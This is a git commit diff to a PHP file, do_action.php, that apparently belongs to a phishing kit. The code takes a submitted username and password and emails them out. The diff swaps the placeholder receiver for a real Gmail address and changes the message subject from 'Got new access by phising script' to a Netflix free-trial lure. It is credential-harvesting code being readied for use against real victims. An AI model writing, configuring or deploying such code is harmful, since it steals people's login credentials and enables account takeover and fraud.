ba727e9d6a7f3402a8f0519ac17e0be0b84dda91
ALITA0 <70105192+ALITA0@users.noreply.github.com>
2020-08-24 00:11:07 +0800

    Update do_action.php

--- do_action.php
+++ do_action.php
@@ -3,9 +3,9 @@
 		$username = $POST['username'];
 		$password = $POST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "Joshuacabias8@gmail.com" ;
 		
-		$subject = "Got new access by phising script";
+		$subject = "Get a 15-day trial from Netflix";
 		$message = "The username is ". $username;
 		$message .= "and password is ". $password;
 		
